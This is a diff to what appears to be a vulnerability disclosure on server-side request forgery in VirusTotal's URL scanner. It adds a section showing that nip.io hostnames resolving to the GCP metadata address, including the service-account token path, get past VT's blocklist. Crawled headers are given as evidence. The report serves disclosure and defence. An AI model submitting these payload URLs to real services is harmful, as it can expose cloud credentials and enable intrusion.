@@ -132,6 +132,30 @@ GET  /api/v3/urls/{id} → last_http_response_headers contains "Server": "Metada
 
 **Note on v1beta1:** Google decommissioned the v1beta1 API (which historically required no header) in 2020. All v1beta1 paths return the same static 404 body.
 
+### nip.io DNS rebinding — second bypass technique confirmed
+
+As an independent verification that VT's filter performs no IP resolution, nip.io subdomains that resolve to `169.254.169.254` were submitted and fetched without being blocked:
+
+| Submitted URL | VT response |
+|--------------|-------------|
+| `http://169-254-169-254.nip.io/computeMetadata/v1/` | `200 OK` — queued and fetched |
+| `http://169-254-169-254.nip.io/computeMetadata/v1/instance/service-accounts/default/token` | `200 OK` — queued and fetched |
+| `http://169.254.169.254.nip.io/computeMetadata/v1/` | `200 OK` — queued and fetched |
+
+After crawling, all three returned `Server: Metadata Server for VM` confirming they reached the same GCP IMDS. This proves VT's blocklist is a hostname **string match only** — it does not resolve the target hostname to an IP and check it against a CIDR blocklist before fetching. Any domain that resolves to a link-local IP bypasses VT's filter.
+
+**nip.io URL object evidence (post-crawl):**
+```json
+{
+  "last_http_response_code": 403,
+  "last_http_response_headers": {
+    "Server": "Metadata Server for VM",
+    "X-Frame-Options": "SAMEORIGIN",
+    "Content-Type": "text/html; charset=UTF-8"
+  }
+}
+```
+
 ### OOB confirmation — GCP scanner IPs observed at webhook.site
 
 When a benign webhook.site URL was submitted to VT for scanning, the following GCP-range IPs sent requests:
